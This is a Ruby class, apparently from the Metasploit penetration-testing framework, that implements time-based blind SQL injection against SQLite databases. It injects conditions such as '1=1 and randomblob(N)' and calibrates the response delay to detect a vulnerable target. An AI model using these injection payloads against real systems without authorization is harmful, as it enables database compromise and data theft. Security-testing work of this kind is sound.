
#
#   Time-Based Blind SQL injection support for SQLite
#
class Msf::Exploit::SQLi::SQLitei::TimeBasedBlind < Msf::Exploit::SQLi::SQLitei::Common
  include ::Msf::Exploit::SQLi::TimeBasedBlindMixin

  HEAVYQUERY_DETECTION_SAMPLE = 10 # number of times to check if the block takes a delay to respond

  #
  # Creates an object that will be used for running time-based blind SQL injections targeting SQLite
  # refer to SQLi::Common#initialize for a description of the options
  # @return [SQLi::SQLitei::TimeBasedBlind]
  #
  def initialize(datastore, framework, user_output, opts = {}, &query_proc)
    super
    if opts[:heavyquery_parameter]
      @heavyquery_parameter = opts[:heavyquery_parameter]
    else
      detect_heavyquery_parameter
    end
    vprint_status "randomblob parameter: #{@heavyquery_parameter}"
  end

  #
  # This method checks if the target is vulnerable to Blind time-based injection by checking if
  # the target sleeps only when a given condition is true.
  #  @return [Boolean] whether the target is detected as vulnerable or not
  #
  def test_vulnerable
    # run_sql and check if output is what's expected, or just check for delays?
    out_true = blind_request("1=1 and randomblob(#{@heavyquery_parameter})")
    out_false = blind_request("1=2 and randomblob(#{@heavyquery_parameter})")
    out_true && !out_false
  end

  private

  #
  # Detects the parameter to pass to randomblob to get a delay of datastore['SqliDelay'], and sets @heavyquery_parameter
  # @return [nil]
  #
  def detect_heavyquery_parameter
    @heavyquery_parameter = 10000000
    max_tries = 100
    loop do
      break if HEAVYQUERY_DETECTION_SAMPLE.times.all? { blind_request("randomblob(#{@heavyquery_parameter})") }

      @heavyquery_parameter *= 2
      max_tries -= 1
      if max_tries == 0
        fail_with Msf::Exploit::Failure::Unknown, 'Could not detect the heavyquery parameter after 100 tries'
      end
    end
    @heavyquery_parameter = @heavyquery_parameter * 3 / 2 # for safety
    nil
  end
end
